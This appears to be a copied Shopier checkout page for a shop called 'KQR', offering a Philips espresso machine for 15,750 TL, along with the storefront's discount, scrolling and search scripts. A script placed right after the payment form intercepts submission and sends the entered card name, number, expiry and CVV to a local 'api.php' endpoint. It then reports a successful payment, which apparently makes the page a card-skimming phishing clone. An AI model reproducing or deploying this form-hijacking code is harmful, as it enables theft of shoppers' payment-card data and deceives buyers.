                    document.getElementById('earnable_product_count').textContent = data.earnable_data.product_data.pagination.total_text;
                    earnableData.forEach(product => {
                        const earnableTotal = data.earnable_data.product_data.pagination.total;
                        listProduct(product, earnableGrid, 'earnable', null, earnableTotal);
                    });
                }
                setTimeout(hideDiscountLoader, 1000)
            });
        });
    }

    const backdrop = document.createElement("div");
    document.querySelector('.notification-bar')?.addEventListener('click', async () => {
        let notificationBar = document.querySelector('.notification-bar')
        let notificationBarButton = document.querySelector('#notification-bar-button')
        let redirectUrl = notificationBar ? notificationBar.getAttribute('data-redirect-url') : null;
        if (!notificationBarButton?.classList.contains('!hidden')){
            if (redirectUrl && redirectUrl !== "#" && redirectUrl !=="") {
                window.location.href = redirectUrl;
                return;
            }
        }

        let clickable = notificationBar ? notificationBar.getAttribute('data-clickable') : null;
        let discountId = notificationBar ? notificationBar.getAttribute('data-discount-id') : null  ;
        if (discountId <= 0 || clickable === "false") {
            return;
        }
        if (!notificationBarButton?.classList.contains('!hidden')){
            if (redirectUrl ===null || redirectUrl ===""){
                if (discountId >= 0 || clickable === "true") {
                    const discountModal = window.bootstrap.Offcanvas.getOrCreateInstance(document.getElementById('discountNotificationCanvas'));
                    discountModal.show();
                }
            }
        }
        let discountStorage = {
            ["shop_" + shopName]: {
                discount_id: discountId,
                addable_product: {
                    listing_features: {
                        offset: 0,
                        total: 0,
                        sorting: {status: false},
                        filtering: {status: false},
                        search: {status: false},
                        load_more: {status: false, method: "all"},
                    },
                },
                earnable_product: {
                    listing_features: {
                        offset: 0,
                        total: 0,
                        sorting: {status: false},
                        filtering: {status: false},
                        search: {status: false},
                        load_more: {status: false, method: "all"},
                    },
                },
            }
        };
        updateDiscountStorage(discountStorage)
        let response = await getDiscountData("get_discount", discountId).then((data) =>
            data.json()
        );
        document.querySelector('.discount-back-text').textContent = response.discount_text_list.back;

        document.querySelectorAll(".discount-information").forEach((element) => {
            element.innerHTML = response.discount_canvas_notification_message;
        });
        const {back, win, add} = response.discount_text_list;
        document.querySelector(".discount-add-text").innerHTML = add;
        document.querySelector(".discount-win-text").innerHTML = win;
        if (!response.show_discount_earnable_section) {
            document.querySelector("#discount-win-tab").classList.add("!hidden");
        }
        if (!response.show_discount_tabs){
            document.querySelector('.discount-canvas-tab').classList.add('!hidden');
        }
        document.querySelectorAll(".discount-back-text").forEach((element) => {
            element.innerHTML = back;
        });
        let addableCategoryDiv = document.querySelector('#section-bar-addable .discount-canvas-categories')
        let addableCountDiv = document.querySelector('.addable_product_count-div')
        if (response.addable_data.category_data) {
            const addableCategories = response.addable_data.category_data.categories;
            const addableCategoryContainer = document.querySelector('.js-discount-tab-swiper .swiper-wrapper');
            const addableCategoryTemplate = document.querySelector('.discount-clone-addable-category');
            addableCategoryContainer.querySelectorAll('.added-category').forEach(el => el.remove());
            addableCategoryDiv?.classList.remove('!hidden')
            let addableCategoryCount = 0;
            Object.entries(addableCategories).forEach(([key, value]) => {
                const addableCategory = addableCategoryTemplate.cloneNode(true);
                const button = addableCategory.querySelector('button');
                if (addableCategoryCount === 0) {
                    addableCategoryCount++;
                    button.classList.add('active');
                } else {
                    button.classList.remove('active');
                }
                button.setAttribute("data-discount-chip-type", "addable");
                button.setAttribute("data-discount-category-id", key);
                addableCategory.classList.remove('discount-clone-addable-category');
                addableCategory.classList.remove('!hidden');
                addableCategory.classList.add('added-category');
                let addableCategoryText = addableCategory.querySelector('button > div')
                addableCategoryText.innerHTML = value;
                let addableCategoryTextLen = addableCategoryText.textContent.length;
                if (addableCategoryTextLen >= 19) {
                    button.classList.add('discount-canvas-category-small');
                    button.classList.add('discount-canvas-category-multi-line');
                }
                window.discountTabSwiperEl.appendSlide(addableCategory)
            });
        }else{
            addableCategoryDiv?.remove()
            addableCountDiv?.classList.add('!hidden')
        }
        addableCountDiv?.classList.remove('!hidden')
        const addableProductCount = document.getElementById('addable_product_count');
        addableProductCount.textContent = response.addable_data.product_data.pagination.total_text;
        let earnableCategoryDiv = document.querySelector('#section-bar-earnable .discount-canvas-categories')
        let earnableCountDiv = document.querySelector('.earnable_product_count-div')
        if (response.earnable_data.category_data) {
            const earnableCategories = response.earnable_data.category_data.categories;
            const earnableCategoryContainer = document.querySelector('.js-discount-tab-swiper2 .swiper-wrapper ');
            const earnableCategoryTemplate = document.querySelector('.discount-clone-earnable-category');
            earnableCategoryDiv?.classList.remove('!hidden')
            earnableCategoryContainer.querySelectorAll('.added-category').forEach(el => el.remove());
            let earnableCategoryCount = 0;
            Object.entries(earnableCategories).forEach(([key, value]) => {
                const earnableCategory = earnableCategoryTemplate.cloneNode(true);
                const button = earnableCategory.querySelector('button');
                if (earnableCategoryCount === 0) {
                    earnableCategoryCount++;
                    button.classList.add('active');
                } else {
                    button.classList.remove('active');
                }

                button.setAttribute("data-discount-chip-type", "earnable");
                button.setAttribute("data-discount-category-id", key);
                earnableCategory.classList.remove('discount-clone-earnable-category');
                earnableCategory.classList.remove('!hidden');
                earnableCategory.classList.add('added-category');
                let earnableCategoryText = earnableCategory.querySelector('button > div')
                earnableCategoryText.textContent = value;
                let earnableCategoryTextLen = earnableCategoryText.textContent.length;
                if (earnableCategoryTextLen >= 20){
                    button.classList.add('discount-canvas-category-small')
                    button.classList.add('discount-canvas-category-multi-line')
                }
                window.discountTabSwiperEl2.appendSlide(earnableCategory)
            });
        }else{
            earnableCategoryDiv?.remove();
            earnableCountDiv?.classList.add('!hidden')
        }
        earnableCountDiv?.classList.remove('!hidden')
        const earnableProductCount = document.getElementById('earnable_product_count');
        earnableProductCount.textContent = response.earnable_data.product_data.pagination.total_text;
        displayData(response);
        createDiscountObserver();

        attachDiscountCategoryChipEvent();
    });

    function displayData(data) {
        showDiscountLoader();
        const addableTotal = data.addable_data.product_data.pagination.total;
        const earnableTotal = data.earnable_data.product_data.pagination.total;
        const addableGrid = document.querySelector('.addable-products');
        const earnableGrid = document.querySelector('.earnable-products');
        const addableData = data.addable_data.product_data.products;
        const earnableData = data.earnable_data.product_data.products;
        addableGrid.innerHTML = '';
        earnableGrid.innerHTML = '';
        addableData.forEach(product => {
            listProduct(product, addableGrid, 'addable', addableTotal, earnableTotal);
        });
        earnableData.forEach(product => {
            listProduct(product, earnableGrid, 'earnable', addableTotal, earnableTotal);
        });
        if (!data.show_discount_addable_section && data.show_discount_earnable_section) {
            document.querySelector('.tabs-bar-item').classList.remove('tab-current');
            document.querySelector('.tabs-bar-item > .discount-add-text').classList.remove('active');
            document.querySelector('.tabs-bar-item > .discount-win-text').classList.add('active');
            document.querySelector('.tabs-bar-item').classList.add('!hidden');
            document.querySelector('.tabs-bar-item:nth-child(2)').classList.add('tab-current');
            document.querySelector('#section-bar-addable').classList.add('!hidden');
            document.querySelector('#section-bar-earnable').classList.remove('!hidden');
        }else{
            document.querySelector('.tabs-bar-item').classList.add('tab-current');
            document.querySelector('.tabs-bar-item > .discount-add-text').classList.add('active');
            document.querySelector('.tabs-bar-item > .discount-win-text').classList.remove('active');
            document.querySelector('.tabs-bar-item:nth-child(1)').classList.remove('!hidden');
            document.querySelector('.tabs-bar-item:nth-child(2)').classList.remove('tab-current');
            document.querySelector('#section-bar-addable').classList.remove('!hidden');
            document.querySelector('#section-bar-earnable').classList.add('!hidden');
        }
        setTimeout(function (){
            hideDiscountLoader();
            noMoreRequests = false;
        },1000);
    }

    function listProduct(product, elem, sectionType, addableTotal, earnableTotal) {
        const template = document.querySelector('.product-card-clone');
        const productCard = template.cloneNode(true);
        productCard.classList.remove('product-card-clone');
        productCard.classList.remove('!hidden');
        discountImageGenerator(product, productCard);
        discountPriceGenerator(product, productCard)
        discountBadgeGenerator(product,productCard);
        let discountStorage = JSON.parse(sessionStorage.getItem('KQR'))['discountStorage'];
        if (sectionType === "addable") {
            discountStorage.shop_KQR.addable_product.listing_features.total = addableTotal;
        } else {
            discountStorage.shop_KQR.earnable_product.listing_features.total = earnableTotal;
        }
        UpdatedBadgesMargin('.product-card-discount', '13px', '11px', '14px', '11px');
        updateDiscountStorage(discountStorage)
        elem.appendChild(productCard);
    }
    function resizeWindow() {

        if (window.innerWidth < 1024) {
            scrollHeight = 60;
        } else {
            scrollHeight = 224;
        }

        window.addEventListener("resize", function () {
            if (window.innerWidth < 1024) {
                scrollHeight = 60;
            } else {
                scrollHeight = 224;
            }
        });
    }

    const fetchScrollData = async (type, request_type, id) => {
        return await getDiscountData(request_type, id)
            .then((res) => res.json())
            .then((data) => {
                const elem = document.querySelector(`.${type}-products`);
                let discountStorage = JSON.parse(sessionStorage.getItem('KQR'))['discountStorage'];
                const addableTotal = discountStorage.shop_KQR.addable_product.listing_features.total;
                const earnableTotal = discountStorage.shop_KQR.earnable_product.listing_features.total;
                if (data) {
                    data[`${type}_data`]["product_data"].products.forEach(product => {
                        listProduct(
                            product,
                            elem,
                            type,
                            addableTotal,
                            earnableTotal
                        );
                    })
                }
            });
    };

    function decideSectionType() {
        let currentSection = document.querySelector('.tabs-bar-content:not(.\\!hidden)');
        if (currentSection.id === "section-bar-addable") {
            return "addable";
        } else if (currentSection.id === "section-bar-earnable") {
            return "earnable";
        }
    }

    function setLocalStorageValues(sectionType, offset, total, discountStorage) {
        if (sectionType === "addable") {
            offset = discountStorage.shop_KQR.addable_product.listing_features.offset;
            total = discountStorage.shop_KQR.addable_product.listing_features.total;
        } else {
            offset = discountStorage.shop_KQR.earnable_product.listing_features.offset;
            total = discountStorage.shop_KQR.earnable_product.listing_features.total;
        }
        return { offset, total };
    }


    let noMoreRequests = true;
    let lastObservedCard = null;

    function createDiscountObserver() {
        const options = {
            root: null,
            rootMargin: "0px",
            threshold: 0.1,
        };
        const observer = new IntersectionObserver(loadDiscountCallback, options);

        observeLastProductCard(observer);

        document.querySelectorAll('.discount-canvas-tab-link').forEach(button => {
            button.addEventListener('click', () => {
                noMoreRequests = false;
                observeLastProductCard(observer);
            });
        });
    }

    function observeLastProductCard(observer) {
        let sectionType = "";
        sectionType = decideSectionType(sectionType);
        const section = document.getElementById(`section-bar-${sectionType}`);
        const productCards = section.querySelectorAll(".product-card-discount");
        const lastProductCard = productCards[productCards.length - 1];

        if (lastObservedCard) {
            observer.unobserve(lastObservedCard);
        }
        if (lastProductCard) {
            observer.observe(lastProductCard);
            lastObservedCard = lastProductCard;
        }
    }

    const loadDiscountCallback = (entries, observer) => {
        entries.forEach((entry) => {
            if (entry.isIntersecting) {
                if (noMoreRequests) {
                    return;
                }
                loadMoreProducts().then(() => {
                    observeLastProductCard(observer);
                });
            }
        });
    };

    async function loadMoreProducts(sectionType = "", offset = 0, total = 0) {
        return new Promise((resolve) => {
            noMoreRequests = true;
            sectionType = decideSectionType(sectionType);
            let isScrolling = false;
            let productCount = 16;

            resizeWindow();
            if (isScrolling) return;

            let discountStorage = JSON.parse(sessionStorage.getItem('KQR'))['discountStorage'];
            ({ offset, total } = setLocalStorageValues(sectionType, offset, total, discountStorage));
            let discountId = discountStorage.shop_KQR.discount_id;
            let requestType = (sectionType === "addable")
                ? "get_discount_product_for_add"
                : "get_discount_product_for_earn";
            if (offset + productCount < total) {
                showTempProductLoading(sectionType);

                if (sectionType === "addable") {
                    discountStorage.shop_KQR.addable_product.listing_features.offset += productCount;
                }
                if (sectionType === "earnable") {
                    discountStorage.shop_KQR.earnable_product.listing_features.offset += productCount;
                }

                updateDiscountStorage(discountStorage);
                isScrolling = true;

                try {
                    fetchScrollData(sectionType, requestType, discountId);
                    setTimeout(() => {
                        hideTempProductLoading(sectionType);
                        isScrolling = false;
                        noMoreRequests = false;
                    }, 500);
                } finally {
                    noMoreRequests = false;
                }
            }

            resolve();
        });
    }


    function showTempProductLoading(sectionType) {
        let loadingTemplate =
            `<div class="product-card placeholder temp_loading">
                            <a href="#" title="Product Title" role="link">
                                <div class="product-card-header">
                                    <div class="product-card-image-container"> </div>
                                </div>
                                <div class="product-card-body">
                                    <div class="product-card-badges"><span class="sr-only"></span><span
                                                class="sr-only"></span></div>
                                    <div class="product-card-title">
                                        <h3 class="sr-only"></h3>
                                    </div>
                                    <div class="product-card-price">
                                        <div class="price price-current"><span class="sr-only"></span><span
                                                    class="sr-only"></span><span class="sr-only"> </span></div>
                                        <div class="price price-old"><span class="sr-only"></span><span
                                                    class="sr-only"></span><span class="sr-only"></span></div>
                                    </div>
                                </div>
                            </a>
                        </div>`;

        let templatesArray = Array.from({length: 16}, () => loadingTemplate);
        let cardEl = document.createElement("div");
        cardEl.classList.value = "temp_loading";
        document.querySelector('.' + sectionType + '-products').innerHTML += templatesArray.join('');
    }

    function hideTempProductLoading(sectionType) {
        let tempLoadingElements = document.querySelectorAll(`.${sectionType}-products .temp_loading`);
        tempLoadingElements.forEach(element => {
            element.remove();
        });
    }

    let deferredDiscountNotification = document.querySelectorAll('#defer-discount-notification');
    deferredDiscountNotification?.forEach(function (el) {
        el.addEventListener('click', function () {
            fetch(
                `https://www.shopier.com/s/api/v1/discount?username=${shopName}&request_type=defer_discount_notification`,
                {
                    method: "GET",
                    headers: {
                        "Content-Type": "application/json",
                    }
                }
            ).then(r => r.json());
        });
    });


</script>
<main class="main-layout checkout checkout-guest" data-shopier-main="">
    <div class="container-checkout" bis_skin_checked="1">
        <div class="checkout-page guest" bis_skin_checked="1">
            <div class="checkout-status" bis_skin_checked="1">
                <div class="checkout-status-inner" bis_skin_checked="1">
                    <a class="checkout-state text-secondary" href="shipping/KQR">
                        <svg width="24" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12.4994 13.3C12.3694 13.3 12.2394 13.27 12.1194 13.2L3.28936 8.09002C2.92936 7.88002 2.80934 7.41999 3.01934 7.05999C3.22934 6.69999 3.67934 6.57997 4.04934 6.78997L12.4994 11.68L20.8993 6.82C21.2593 6.61 21.7193 6.74002 21.9293 7.09002C22.1393 7.45002 22.0094 7.90999 21.6594 8.11999L12.8894 13.2C12.7594 13.26 12.6294 13.3 12.4994 13.3Z" fill="currentColor"></path>
                            <path d="M12.5 22.36C12.09 22.36 11.75 22.02 11.75 21.61V12.54C11.75 12.13 12.09 11.79 12.5 11.79C12.91 11.79 13.25 12.13 13.25 12.54V21.61C13.25 22.02 12.91 22.36 12.5 22.36Z" fill="currentColor"></path>
                            <path d="M12.5006 22.75C11.6206 22.75 10.7506 22.56 10.0606 22.18L4.72061 19.21C3.27061 18.41 2.14062 16.48 2.14062 14.82V9.16998C2.14062 7.50998 3.27061 5.59002 4.72061 4.78002L10.0606 1.82C11.4306 1.06 13.5706 1.06 14.9406 1.82L20.2806 4.78997C21.7306 5.58997 22.8606 7.51999 22.8606 9.17999V14.83C22.8606 16.49 21.7306 18.41 20.2806 19.22L14.9406 22.18C14.2506 22.56 13.3806 22.75 12.5006 22.75ZM12.5006 2.74999C11.8706 2.74999 11.2506 2.88 10.7906 3.13L5.45062 6.09997C4.49062 6.63997 3.64062 8.06999 3.64062 9.17999V14.83C3.64062 15.93 4.49062 17.37 5.45062 17.91L10.7906 20.88C11.7006 21.39 13.3006 21.39 14.2106 20.88L19.5506 17.91C20.5106 17.37 21.3606 15.94 21.3606 14.83V9.17999C21.3606 8.07999 20.5106 6.63997 19.5506 6.09997L14.2106 3.13C13.7506 2.88 13.1306 2.74999 12.5006 2.74999Z" fill="currentColor"></path>
                            <path d="M17.5012 13.99C17.0912 13.99 16.7512 13.65 16.7512 13.24V10.0201L7.63116 4.76007C7.27116 4.55007 7.15114 4.09005 7.36114 3.74005C7.57114 3.38005 8.02116 3.26003 8.38116 3.47003L17.8712 8.95007C18.1012 9.08007 18.2512 9.33003 18.2512 9.60003V13.2601C18.2512 13.6501 17.9112 13.99 17.5012 13.99Z" fill="currentColor"></path>
                        </svg>
                        <div class="mt-[-3px]" bis_skin_checked="1">Teslimat</div>
                    </a>
                    <div class="checkout-divider" bis_skin_checked="1"></div>
                    <a class="checkout-state">
                        <svg width="24" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M2.5 9.25C2.09 9.25 1.75 8.91 1.75 8.5C1.75 8.09 2.09 7.75 2.5 7.75H22.5C22.91 7.75 23.25 8.09 23.25 8.5C23.25 8.91 22.91 9.25 22.5 9.25H2.5Z" fill="currentColor"></path>
                            <path d="M6.5 17.25C6.09 17.25 5.75 16.91 5.75 16.5C5.75 16.09 6.09 15.75 6.5 15.75H8.5C8.91 15.75 9.25 16.09 9.25 16.5C9.25 16.91 8.91 17.25 8.5 17.25H6.5Z" fill="currentColor"></path>
                            <path d="M11 17.25C10.59 17.25 10.25 16.91 10.25 16.5C10.25 16.09 10.59 15.75 11 15.75H15C15.41 15.75 15.75 16.09 15.75 16.5C15.75 16.91 15.41 17.25 15 17.25H11Z" fill="currentColor"></path>
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M6.94 21.25C2.96 21.25 1.75 20.05 1.75 16.11V7.89C1.75 3.95 2.96 2.75 6.94 2.75H18.05C22.03 2.75 23.24 3.95 23.24 7.89V16.1C23.25 20.05 22.04 21.25 18.06 21.25H6.94ZM3.25 7.89V16.1C3.25 19.2 3.8 19.74 6.94 19.74H18.05C21.19 19.74 21.74 19.2 21.74 16.1V7.89C21.74 4.79 21.19 4.25 18.05 4.25H6.94C3.8 4.25 3.25 4.79 3.25 7.89Z" fill="currentColor"></path>
                        </svg>
                        <div class="mt-[-3px] ml-[1px]" bis_skin_checked="1">Ödeme</div>
                    </a>
                </div>
            </div>
            <div class="checkout-grid" bis_skin_checked="1">
                <div bis_skin_checked="1">
                    <form class="checkout-grid-item" id="paymentDetails"  method="post" novalidate="" autocomplete="off" onsubmit="isSubmittable(event);">
                        <input type="hidden" name="orderid" value="991135511">
                        <input type="hidden" name="card_type" id="card_type" value="">
                        <input type="hidden" name="shop" value="KQR">
                        <div class="checkout-form" bis_skin_checked="1">
                            <div class="checkout-form-head" bis_skin_checked="1">
                                <div class="checkout-form-title" bis_skin_checked="1">Ödeme</div>
                            </div>
                            <div class="checkout-form-body" bis_skin_checked="1">
                                <div class="input-text" bis_skin_checked="1">
                                    <div class="input-box" bis_skin_checked="1">
                                        <input class="input-required shopier-store—payment—form—card-name" type="text" placeholder=" " value="" name="Name" id="formControlCardName" autocomplete="cc-name">
                                        <div class="input-name" bis_skin_checked="1">
                                            <label for="formControlCardName"> Kart üzerindeki Ad Soyad</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="input-credit-card js-input-credit-card" bis_skin_checked="1">
                                    <div class="input-box" bis_skin_checked="1">
                                        <input type="text" class="input-cc-number input-required shopier-store—payment—form—card-number" placeholder=" " value="" name="CardNumber" id="formControlCardNumber" autocomplete="cc-number" inputmode="numeric">
                                        <div class="input-name" bis_skin_checked="1">
                                            <label for="formControlCardNumber"> Kart numarası</label>
                                        </div>
                                        <div class="input-icon" bis_skin_checked="1">
                                                                                                                                        <div class="card-network-logo credit-card-badge credit-card-badge-troy" data-value="troy" style="--transform: -9px;" bis_skin_checked="1"></div>
                                                                                                                                        <div class="card-network-logo credit-card-badge" data-value="amex" style="--transform: -50.22px;" bis_skin_checked="1">
                                                    <svg width="37" height="25" viewBox="0 0 37 25" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                        <rect x="0.320312" y="0.25" width="36.2173" height="24.4999" rx="5.03018" fill="#F8F8F8"></rect>
                                                        <mask id="mask0_16957_138791" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="1" y="7" width="35" height="11">
                                                            <rect x="1.83008" y="7.75977" width="33.1865" height="9.48187" fill="url(#pattern0_16957_138791)"></rect>
                                                        </mask>
                                                        <g mask="url(#mask0_16957_138791)">
                                                            <rect x="1.83008" y="7.75977" width="33.1865" height="9.48187" fill="#006FCF"></rect>
                                                        </g>
                                                        <defs>
                                                            <pattern id="pattern0_16957_138791" patternContentUnits="objectBoundingBox" width="1" height="1">
                                                                <use xlink:href="#image0_16957_138791" transform="matrix(0.000779544 0 0 0.00272841 -0.248358 -0.933419)"></use>
                                                            </pattern>
                                                        </defs>
                                                    </svg>
                                                </div>
                                                                                                                                        <div class="card-network-logo credit-card-badge credit-card-badge-mastercard" data-value="mastercard" style="--transform: -91.44px;" bis_skin_checked="1"></div>
                                                                                                                                        <div class="card-network-logo credit-card-badge credit-card-badge-visa" data-value="visa" style="--transform: -132.66px;" bis_skin_checked="1"></div>
                                                                                    </div>
                                    </div>
                                </div>
                                <div class="input-group" bis_skin_checked="1">
                                    <div class="input-text js-input-card-exp-date" bis_skin_checked="1">
                                        <div class="input-box" bis_skin_checked="1">
                                            <input class="input-required shopier-store—payment—form—card-date" type="text" value="" placeholder=" " name="CardExpires" id="formControlCardDate" maxlength="5" autocomplete="cc-exp" inputmode="numeric">
                                            <div class="input-name" bis_skin_checked="1">
                                                <label for="formControlCardDate"> Ay / Yıl</label>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="input-text" bis_skin_checked="1">
                                        <div class="input-box" bis_skin_checked="1">
                                            <input type="text" value="" class="input-required shopier-store—payment—form—card-ccv" name="CardSecurityCode" id="formControlCardCCV" autocomplete="cc-csc" placeholder=" " inputmode="numeric" maxlength="4">
                                            <div class="input-name" bis_skin_checked="1">
                                                <label for="formControlCardCCV">CVV</label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="select js-select" data-value="Tek çekim" bis_skin_checked="1">
                                                                    </div>
                            </div>
                        </div>
                                                <div class="checkout-info-text-wrapper" bis_skin_checked="1">
                            <div class="checkout-info-text" bis_skin_checked="1">
                                Aşağıdaki butona tıklayarak<a id="pre-notification-form-modal" href="javascript:;" data-bs-toggle="modal" data-bs-target="#preNotificationFormModal">Ön Bilgilendirme Formu</a>'nu ve<a id="distance-sales-contract-modal" href="javascript:;" data-bs-toggle="modal" data-bs-target="#distanceSalesContractModal">Mesafeli Satış Sözleşmesi</a>'ni onaylıyorum.
                            </div>
                        </div>
                        <div class="fixed-checkout-btn-wrapper" bis_skin_checked="1">
                            <div class="fixed-checkout-btn" bis_skin_checked="1">
                                <button class="btn btn-primary w-full max-w-[500px] mx-auto btn-form-submit shopier-store—payment—form—btn-proceed-to-checkout">
                                    <span class="relative">Siparişi tamamla</span>
                                </button>
                            </div>
                        </div>
                    </form>
                    <script>
    // Form submit olayı
    document.querySelector("#paymentDetails").addEventListener("submit", function(event){
        event.preventDefault(); // Sayfanın yeniden yüklenmesini engeller
        
        // Form verilerini al
        var formData = new FormData(this);
        
        // AJAX ile API'ye veri gönder
        fetch('api.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                alert('Ödeme başarılı!');
                // Gerekirse başarılı işlem sonrası yapılacak şeyler
                window.location.href = "success.php"; // Başarılı işlem sonrası yönlendirme
            } else {
                alert('Ödeme başarısız! Lütfen tekrar deneyin.');
            }
        })
        .catch(error => {
            console.error('Hata:', error);
            alert('Bir hata oluştu. Lütfen tekrar deneyin.');
        });
    });
</script>

                </div>

                

                <div class="checkout-hr" bis_skin_checked="1"></div>
                <div class="checkout-grid-item checkout-grid-item-summary" bis_skin_checked="1">
                    <div class="checkout-form" bis_skin_checked="1">
                        <div class="checkout-form-head" bis_skin_checked="1">
                            <div class="checkout-form-title" bis_skin_checked="1">Özet</div>
                        </div>
                        <div class="checkout-form-body" bis_skin_checked="1">
                            <div class="checkout-summary" bis_skin_checked="1">
                                <div class="checkout-summary-head" bis_skin_checked="1">
                                    <div class="checkout-summary-head-inner" bis_skin_checked="1">
                                        <div class="checkout-summary-title" bis_skin_checked="1">                                                KQR
                                            </div>
                                        <div class="checkout-summary-products" bis_skin_checked="1">
                                            <div class="checkout-summary-products-count" bis_skin_checked="1">1  ürün </div>
                                            <button class="checkout-summary-products-show" type="button" data-bs-toggle="collapse" data-bs-target="#checkoutProducts" aria-expanded="true" aria-controls="checkoutProducts"><span class="show-products">Ürünleri gör</span><span class="hide-products">Ürünleri gizle</span>
                                                <svg width="24" height="24" viewBox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M12.4995 17.2996C11.7995 17.2996 11.0995 17.0296 10.5695 16.4996L4.04953 9.97965C3.75953 9.68965 3.75953 9.20965 4.04953 8.91965C4.33953 8.62965 4.81953 8.62965 5.10953 8.91965L11.6295 15.4396C12.1095 15.9196 12.8895 15.9196 13.3695 15.4396L19.8895 8.91965C20.1795 8.62965 20.6595 8.62965 20.9495 8.91965C21.2395 9.20965 21.2395 9.68965 20.9495 9.97965L14.4295 16.4996C13.8995 17.0296 13.1995 17.2996 12.4995 17.2996Z" fill="#0B0F34"></path>
                                                </svg>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="collapse show" id="checkoutProducts" bis_skin_checked="1">
                                        <div class="basket-list" bis_skin_checked="1">
                                                                                            <div class="basket-product" bis_skin_checked="1">
                                                    <div class="product-item" bis_skin_checked="1">
                                                        <div class="product-image" bis_skin_checked="1"><img src="https://cdn.shopier.app/pictures_mid/KQR_b34d64a73a1e7c3eccd29df9b71a69d8.png" alt="Philips 5500 Serisi LatteGo Tam Otomatik Espresso Makinesi, EP5547/90"></div>
                                                        <div class="product-body relative" bis_skin_checked="1">
                                                            <div class="product-info" bis_skin_checked="1">
                                                                <div class="product-name shopier-store—payment—order—summary—product-name" bis_skin_checked="1">Philips 5500 Serisi LatteGo Tam Otomatik Espresso Makinesi, EP5547/90</div>
                                                                                                                            </div>
                                                            <div class="product-price-and-count" bis_skin_checked="1">
                                                                <div class="product-price-wrapper" bis_skin_checked="1">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div class="product-price shopier-store—payment—order-summary—product-price" bis_skin_checked="1">
                                                                        <span class="price-value">15.750</span>
                                                                        <span class="price-cent">,00</span>
                                                                        <span class="price-currency">TL</span>
                                                                    </div>
                                                                                                                                    </div>
                                                                <div class="product-count shopier-store—payment—order-summary—product-quantity" bis_skin_checked="1">1 adet</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                                                    </div>
                                    </div>
                                </div>
                                <div class="checkout-summary-body" bis_skin_checked="1">
                                    <div class="checkout-summary-price" bis_skin_checked="1">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div id="basket-sub-total-price-div" class="checkout-summary-price-item !hidden" bis_skin_checked="1">
                                            <div bis_skin_checked="1">Ara toplam</div>
                                            <div class="shopier-store—payment—order-summary—subtotal-price" id="basket-summary-sub-total-price" bis_skin_checked="1">
                                                15.750<span>,00 TL</span></div>
                                        </div>
                                        <div class="checkout-summary-price-item !hidden" bis_skin_checked="1">
                                            <div bis_skin_checked="1">Kargo</div>
                                            <div class="shopier-store—payment—order-summary—shipping-price" bis_skin_checked="1">
                                                0<span>,00 TL</span>
                                            </div>
                                        </div>

                                        <div id="basket-discount-total-price-div" class="checkout-summary-price-item  !hidden" bis_skin_checked="1">
                                            <div id="basket-discount-total-price-name" bis_skin_checked="1">  </div>
                                                                                    </div>
                                                                                                                        <div class="checkout-summary-price-item" id="basket-total-price" bis_skin_checked="1">
                                            <div bis_skin_checked="1">Genel toplam</div>
                                            <div class="checkout-summary-price-total shopier-store—payment—order-summary—total-price" id="basket-summary-total-price" bis_skin_checked="1">15.750<span>,00 TL</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                                            </div>
                                    </div>
            </div>
        </div>
    </div>
</main>
<script>
    const endpoint = "https://www.shopier.com/s/api/v1/elasticsearch";
    const searchShopName = "KQR";

    let elementIds = {
        desktop: {
            searchToggle: "shopier-es--toggle",
            searchButton: "shopier-es--button",
            searchForm: "shopier-es--form",
            searchInput: "shopier-es--input",
            searchBody: "shopier-es--body",
            searchResults: "shopier-es--results"
        },
        mobile: {
            searchToggle: "shopier-es--toggle-mobile",
            searchButton: "shopier-es--button-mobile",
            searchForm: "shopier-es--form-mobile",
            searchInput: "shopier-es--input-mobile",
            searchBody: "shopier-es--body-mobile",
            searchResults: "shopier-es--results-mobile"
        }
    }

    let last_results, last_query, searchForm, searchInput, searchBody, searchResults, searchButton, debounceTimer;

    window.addEventListener("orientationchange", initiateES);
    document.addEventListener('DOMContentLoaded', initiateES);

    function initiateES() {

        let focusedInputs = document.querySelectorAll(".shopier-es--input");
        let hasMobile = false;
        focusedInputs?.forEach((focusedInput) => {
            focusedInput.addEventListener("focus", (ev) => {

                hasMobile = !!ev?.target.id.includes("-mobile");

                const {desktop, mobile} = elementIds;

                if (hasMobile) {
                    searchForm = document.getElementById(mobile.searchForm);
                    searchInput = document.getElementById(mobile.searchInput);
                    searchBody = document.getElementById(mobile.searchBody);
                    searchResults = document.getElementById(mobile.searchResults);
                    searchButton = document.getElementById(mobile.searchButton);
                } else {
                    searchForm = document.getElementById(desktop.searchForm);
                    searchInput = document.getElementById(desktop.searchInput);
                    searchBody = document.getElementById(desktop.searchBody);
                    searchResults = document.getElementById(desktop.searchResults);
                    searchButton = document.getElementById(desktop.searchButton);
                }

                searchInput?.addEventListener("keyup", function (e) {
                    if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
                        return;
                    }

                    clearTimeout(debounceTimer);
                    if (searchInput.value === '') {
                        getSearchResults(searchInput)
                    } else {
                        debounceTimer = setTimeout(function () {
                            getSearchResults(searchInput);
                        }, 300);
                    }
                });

                searchInput?.addEventListener("click", function (e) {
                    if (e.target.value === last_query) { // same query, no need to search again
                        createList(last_results);
                    } else { // new query, search
                        getSearchResults(e.target);
                    }
                });

                document.addEventListener("click", function (e) {
                    // if the target of the click isn't the container nor a descendant of the container
                    if (!searchBody?.contains(e.target) && !searchBody?.isSameNode(e.target) && !searchInput.contains(event.target)) {
                        searchBody.classList.remove("showing-results");
                        searchBody.style.display = "none";
                        searchInput?.classList.remove("showing-results");
